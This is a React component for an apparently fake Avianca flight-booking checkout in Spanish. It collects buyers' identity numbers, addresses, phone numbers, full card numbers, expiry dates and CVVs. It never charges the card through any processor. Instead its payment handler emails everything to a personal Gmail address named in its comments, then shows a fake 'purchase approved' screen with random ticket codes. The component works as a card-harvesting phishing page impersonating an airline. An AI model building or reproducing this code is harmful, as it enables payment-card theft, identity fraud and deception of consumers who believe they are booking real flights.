import React, { useState } from 'react';
import { X, CreditCard, Check, Download, Home, Mail } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { paymentStore, PaymentData } from '@/store/paymentStore';
import { sendPaymentEmail } from '@/services/emailService';
import CreditCardInput from './CreditCardInput';

interface Flight {
  id: number;
  from: string;
  to: string;
  departure: string;
  arrival: string;
  duration: string;
  price: number;
  airline: string;
}

interface PassengerData {
  firstName: string;
  lastName: string;
  idType: string;
  idNumber: string;
  birthDate: string;
  gender: string;
}

interface PaymentModalProps {
  isOpen: boolean;
  onClose: () => void;
  flight: Flight | null;
  passengers: PassengerData[];
  onPaymentSuccess: () => void;
}

const PaymentModal = ({ isOpen, onClose, flight, passengers, onPaymentSuccess }: PaymentModalProps) => {
  const [step, setStep] = useState(1);
  const [paymentData, setPaymentData] = useState<PaymentData | null>(null);
  const [emailSent, setEmailSent] = useState(false);
  const [emailError, setEmailError] = useState(false);
  const [cardData, setCardData] = useState({
    number: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardType: ''
  });
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    idType: 'CC',
    idNumber: '',
    email: '',
    phone: '',
    address: '',
    city: '',
    cardName: ''
  });

  const formatPrice = (price: number) => {
    return new Intl.NumberFormat('es-CO', {
      style: 'currency',
      currency: 'COP',
      minimumFractionDigits: 0,
      maximumFractionDigits: 0
    }).format(price);
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const generateTicketCode = () => {
    return Math.random().toString(36).substr(2, 9).toUpperCase();
  };

  const handlePayment = async () => {
    setTimeout(async () => {
      if (flight) {
        // Agregar código de pasaje a cada pasajero
        const passengersWithTickets = passengers.map(passenger => ({
          ...passenger,
          ticketCode: generateTicketCode()
        }));

        const savedPayment = paymentStore.addPayment({
          flight: {
            from: flight.from,
            to: flight.to,
            departure: flight.departure,
            arrival: flight.arrival,
            airline: flight.airline,
            price: flight.price
          },
          passengers: passengersWithTickets,
          buyer: {
            firstName: formData.firstName,
            lastName: formData.lastName,
            idType: formData.idType,
            idNumber: formData.idNumber,
            email: formData.email,
            phone: formData.phone,
            address: formData.address,
            city: formData.city
          },
          payment: {
            cardName: formData.cardName,
            cardNumber: cardData.number,
            expiryDate: `${cardData.expiryMonth}/${cardData.expiryYear}`,
            cvv: cardData.cvv
          },
          totalAmount: totalAmount
        });
        
        setPaymentData(savedPayment);

        // Intentar enviar el correo electrónico a kzadorcol@gmail.com
        try {
          console.log('Enviando email a kzadorcol@gmail.com...');
          const emailSentSuccessfully = await sendPaymentEmail(savedPayment);
          setEmailSent(emailSentSuccessfully);
          setEmailError(!emailSentSuccessfully);
        } catch (error) {
          console.error('Error enviando email:', error);
          setEmailSent(false);
          setEmailError(true);
        }
      }
      
      setStep(3);
    }, 2000);
  };

  const downloadReceipt = () => {
    if (!paymentData) return;

    const receiptContent = generateReceiptHTML(paymentData);
    const printWindow = window.open('', '_blank');
    if (printWindow) {
      printWindow.document.write(receiptContent);
      printWindow.document.close();
      printWindow.print();
    }
  };

  const generateReceiptHTML = (payment: PaymentData): string => {
    const formatDateTime = (timestamp: string) => {
      return new Date(timestamp).toLocaleString('es-CO', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit'
      });
    };

    return `
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="UTF-8">
        <title>Recibo de Compra - Avianca</title>
        <style>
          body { font-family: Arial, sans-serif; margin: 20px; color: #333; }
          .header { text-align: center; border-bottom: 2px solid #dc2626; padding-bottom: 20px; margin-bottom: 20px; }
          .logo { width: 200px; height: auto; margin-bottom: 10px; }
          .title { color: #dc2626; font-size: 24px; font-weight: bold; margin: 10px 0; }
          .booking-ref { background: #dc2626; color: white; padding: 10px; text-align: center; font-size: 18px; font-weight: bold; margin: 20px 0; }
          .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
          .section-title { font-size: 16px; font-weight: bold; color: #dc2626; margin-bottom: 10px; border-bottom: 1px solid #eee; padding-bottom: 5px; }
          .info-row { display: flex; justify-content: space-between; margin: 8px 0; }
          .passenger-box { background: #f9f9f9; padding: 10px; margin: 10px 0; border-radius: 5px; }
          .total-box { background: #dc2626; color: white; padding: 15px; text-align: center; font-size: 20px; font-weight: bold; margin: 20px 0; }
          .footer { text-align: center; margin-top: 30px; font-size: 12px; color: #666; }
          @media print { body { margin: 0; } }
        </style>
      </head>
      <body>
        <div class="header">
          <img src="/lovable-uploads/a561e099-194d-42a7-8a35-6a982e383bdf.png" alt="Avianca" class="logo">
          <div class="title">RECIBO DE BILLETE ELECTRÓNICO</div>
          <div>Fecha de emisión: ${formatDateTime(payment.timestamp)}</div>
        </div>

        <div class="booking-ref">
          CÓDIGO DE RESERVA: ${payment.bookingReference}
        </div>

        <div class="section">
          <div class="section-title">INFORMACIÓN DEL VUELO</div>
          <div class="info-row"><span><strong>Ruta:</strong></span><span>${payment.flight.from} → ${payment.flight.to}</span></div>
          <div class="info-row"><span><strong>Fecha de salida:</strong></span><span>${payment.flight.departure}</span></div>
          <div class="info-row"><span><strong>Fecha de llegada:</strong></span><span>${payment.flight.arrival}</span></div>
          <div class="info-row"><span><strong>Aerolínea:</strong></span><span>${payment.flight.airline}</span></div>
        </div>

        <div class="section">
          <div class="section-title">INFORMACIÓN DEL COMPRADOR</div>
          <div class="info-row"><span><strong>Nombre:</strong></span><span>${payment.buyer.firstName} ${payment.buyer.lastName}</span></div>
          <div class="info-row"><span><strong>Documento:</strong></span><span>${payment.buyer.idType} ${payment.buyer.idNumber}</span></div>
          <div class="info-row"><span><strong>Email:</strong></span><span>${payment.buyer.email}</span></div>
          <div class="info-row"><span><strong>Teléfono:</strong></span><span>${payment.buyer.phone}</span></div>
          <div class="info-row"><span><strong>Dirección:</strong></span><span>${payment.buyer.address}, ${payment.buyer.city}</span></div>
        </div>

        <div class="section">
          <div class="section-title">PASAJEROS Y CÓDIGOS DE PASAJE</div>
          ${payment.passengers.map((passenger, index) => `
            <div class="passenger-box">
              <div><strong>Pasajero ${index + 1}:</strong> ${passenger.firstName} ${passenger.lastName}</div>
              <div><strong>Documento:</strong> ${passenger.idType} ${passenger.idNumber}</div>
              <div><strong>Fecha de nacimiento:</strong> ${passenger.birthDate}</div>
              <div><strong>Género:</strong> ${passenger.gender === 'M' ? 'Masculino' : 'Femenino'}</div>
              <div style="background: #dc2626; color: white; padding: 5px; margin-top: 5px; text-align: center; font-weight: bold;">
                CÓDIGO DE PASAJE: ${passenger.ticketCode}
              </div>
            </div>
          `).join('')}
        </div>

        <div class="total-box">
          TOTAL PAGADO: ${formatPrice(payment.totalAmount)}
        </div>

        <div class="footer">
          <p>¡Gracias por elegir Avianca!</p>
          <p>Para cualquier consulta, contacta nuestro servicio al cliente</p>
          <p>Este es un documento electrónico válido</p>
        </div>
      </body>
      </html>
    `;
  };

  const resetModal = () => {
    setStep(1);
    setPaymentData(null);
    setEmailSent(false);
    setEmailError(false);
    setCardData({
      number: '',
      expiryMonth: '',
      expiryYear: '',
      cvv: '',
      cardType: ''
    });
    setFormData({
      firstName: '',
      lastName: '',
      idType: 'CC',
      idNumber: '',
      email: '',
      phone: '',
      address: '',
      city: '',
      cardName: ''
    });
  };

  const handleClose = () => {
    resetModal();
    onClose();
  };

  const handleReturnHome = () => {
    resetModal();
    onPaymentSuccess();
  };

  const isCardValid = () => {
    const { number, expiryMonth, expiryYear, cvv, cardType } = cardData;
    const cleanNumber = number.replace(/\s/g, '');
    
    if (!cardType || !number || !expiryMonth || !expiryYear || !cvv) return false;
    
    // Validar longitud específica por tipo
    const cardTypeConfigs = {
      visa: { digits: 16, cvvLength: 3 },
      mastercard: { digits: 16, cvvLength: 3 },
      amex: { digits: 15, cvvLength: 4 }
    };
    
    const config = cardTypeConfigs[cardType as keyof typeof cardTypeConfigs];
    if (!config) return false;
    
    if (cleanNumber.length !== config.digits) return false;
    if (cvv.length !== config.cvvLength) return false;
    if (expiryMonth.length !== 2 || expiryYear.length !== 4) return false;
    
    // Validar que no esté vencida
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear();
    const currentMonth = currentDate.getMonth() + 1;
    const expYear = parseInt(expiryYear);
    const expMonth = parseInt(expiryMonth);
    
    if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
      return false;
    }
    
    return true;
  };

  const totalAmount = flight ? flight.price * passengers.length : 0;

  if (!isOpen || !flight) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto">
        <div className="flex items-center justify-between p-6 border-b">
          <h2 className="text-xl font-bold text-gray-800">
            {step === 1 && 'Información del comprador'}
            {step === 2 && 'Información de pago'}
            {step === 3 && '¡Compra aprobada!'}
          </h2>
          {step !== 3 && (
            <button onClick={handleClose} className="text-gray-400 hover:text-gray-600">
              <X className="w-6 h-6" />
            </button>
          )}
        </div>

        <div className="p-6">
          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <h3 className="font-semibold mb-2">Resumen de la compra</h3>
            <div className="flex justify-between items-center mb-2">
              <div>
                <p className="text-sm text-gray-600">{flight.from} → {flight.to}</p>
                <p className="text-sm text-gray-600">Salida: {flight.departure} - Llegada: {flight.arrival}</p>
                <p className="text-sm text-gray-600">Pasajeros: {passengers.length}</p>
              </div>
              <div className="text-right">
                <p className="text-2xl font-bold text-red-600">{formatPrice(totalAmount)}</p>
                <p className="text-sm text-gray-500">Total</p>
              </div>
            </div>
          </div>

          {step === 1 && (
            <div className="space-y-4">
              <h3 className="font-semibold mb-4">Datos de la persona que realiza la compra</h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="firstName">Nombre completo *</Label>
                  <Input
                    id="firstName"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    placeholder="Ingresa tu nombre completo"
                    required
                  />
                </div>
                <div>
                  <Label htmlFor="lastName">Apellidos *</Label>
                  <Input
                    id="lastName"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    placeholder="Ingresa tus apellidos"
                    required
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="idType">Tipo de documento *</Label>
                  <select
                    id="idType"
                    name="idType"
                    value={formData.idType}
                    onChange={handleInputChange}
                    className="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm"
                  >
                    <option value="CC">Cédula de Ciudadanía</option>
                    <option value="CE">Cédula de Extranjería</option>
                    <option value="PA">Pasaporte</option>
                  </select>
                </div>
                <div>
                  <Label htmlFor="idNumber">Número de documento *</Label>
                  <Input
                    id="idNumber"
                    name="idNumber"
                    value={formData.idNumber}
                    onChange={handleInputChange}
                    placeholder="Número de cédula"
                    required
                  />
                </div>
              </div>
              
              <div>
                <Label htmlFor="email">Correo electrónico *</Label>
                <Input
                  id="email"
                  name="email"
                  type="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  placeholder="correo@ejemplo.com"
                  required
                />
              </div>
              
              <div>
                <Label htmlFor="phone">Teléfono celular *</Label>
                <Input
                  id="phone"
                  name="phone"
                  type="tel"
                  value={formData.phone}
                  onChange={handleInputChange}
                  placeholder="300 123 4567"
                  required
                />
              </div>

              <div>
                <Label htmlFor="address">Dirección de domicilio *</Label>
                <Input
                  id="address"
                  name="address"
                  value={formData.address}
                  onChange={handleInputChange}
                  placeholder="Calle 123 # 45-67"
                  required
                />
              </div>

              <div>
                <Label htmlFor="city">Ciudad *</Label>
                <Input
                  id="city"
                  name="city"
                  value={formData.city}
                  onChange={handleInputChange}
                  placeholder="Bogotá"
                  required
                />
              </div>
              
              <Button 
                onClick={() => setStep(2)}
                className="w-full bg-red-600 hover:bg-red-700"
                disabled={!formData.firstName || !formData.lastName || !formData.email || !formData.phone || !formData.idNumber || !formData.address || !formData.city}
              >
                Continuar al pago
              </Button>
            </div>
          )}

          {step === 2 && (
            <div className="space-y-4">
              <div className="flex items-center space-x-2 mb-4">
                <CreditCard className="w-5 h-5 text-gray-600" />
                <span className="font-medium">Información de la tarjeta</span>
              </div>
              
              <div>
                <Label htmlFor="cardName">Nombre en la tarjeta *</Label>
                <Input
                  id="cardName"
                  name="cardName"
                  value={formData.cardName}
                  onChange={handleInputChange}
                  placeholder="Nombre como aparece en la tarjeta"
                  required
                />
              </div>
              
              <CreditCardInput onCardChange={setCardData} />
              
              <div className="flex space-x-4">
                <Button 
                  onClick={() => setStep(1)}
                  variant="outline"
                  className="flex-1"
                >
                  Volver
                </Button>
                <Button 
                  onClick={handlePayment}
                  className="flex-1 bg-red-600 hover:bg-red-700"
                  disabled={!formData.cardName || !isCardValid()}
                >
                  Procesar pago - {formatPrice(totalAmount)}
                </Button>
              </div>
            </div>
          )}

          {step === 3 && (
            <div className="text-center space-y-4">
              <div className="flex justify-center mb-4">
                <img src="/lovable-uploads/a561e099-194d-42a7-8a35-6a982e383bdf.png" alt="Avianca Logo" className="h-16" />
              </div>
              
              <div className="flex justify-center">
                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
                  <Check className="w-8 h-8 text-green-600" />
                </div>
              </div>
              
              <h3 className="text-2xl font-bold text-green-600">¡Compra aprobada!</h3>
              <p className="text-gray-600 text-lg">
                Tu reserva ha sido procesada exitosamente
              </p>

              {/* Estado del email */}
              <div className={`p-3 rounded-lg ${emailSent ? 'bg-green-50 border border-green-200' : emailError ? 'bg-red-50 border border-red-200' : 'bg-yellow-50 border border-yellow-200'}`}>
                <div className="flex items-center justify-center space-x-2">
                  <Mail className={`w-5 h-5 ${emailSent ? 'text-green-600' : emailError ? 'text-red-600' : 'text-yellow-600'}`} />
                  <span className={`text-sm font-medium ${emailSent ? 'text-green-800' : emailError ? 'text-red-800' : 'text-yellow-800'}`}>
                    {emailSent ? 'Email enviado a kzadorcol@gmail.com' : emailError ? 'Error enviando email - configura EmailJS' : 'Enviando email...'}
                  </span>
                </div>
              </div>

              <div className="bg-red-50 rounded-lg p-4 text-left mt-6">
                <h4 className="font-semibold mb-3 text-red-800">Código de Reserva:</h4>
                <div className="bg-red-600 text-white p-3 rounded text-center font-bold text-lg">
                  {paymentData?.bookingReference}
                </div>
              </div>
              
              <div className="bg-green-50 rounded-lg p-4 text-left mt-6">
                <h4 className="font-semibold mb-3">Detalles de la reserva:</h4>
                <div className="space-y-1 text-sm">
                  <p><strong>Nombre:</strong> {formData.firstName} {formData.lastName}</p>
                  <p><strong>Documento:</strong> {formData.idType} {formData.idNumber}</p>
                  <p><strong>Vuelo:</strong> {flight.from} → {flight.to}</p>
                  <p><strong>Fecha:</strong> {flight.departure}</p>
                  <p><strong>Pasajeros:</strong> {passengers.length}</p>
                  <p><strong>Total pagado:</strong> {formatPrice(totalAmount)}</p>
                </div>
              </div>

              <div className="flex space-x-4 mt-6">
                <Button
                  onClick={downloadReceipt}
                  className="flex-1 bg-red-600 hover:bg-red-700"
                >
                  <Download className="w-4 h-4 mr-2" />
                  Descargar Recibo
                </Button>
                <Button
                  onClick={handleReturnHome}
                  variant="outline"
                  className="flex-1"
                >
                  <Home className="w-4 h-4 mr-2" />
                  Volver al Inicio
                </Button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default PaymentModal;
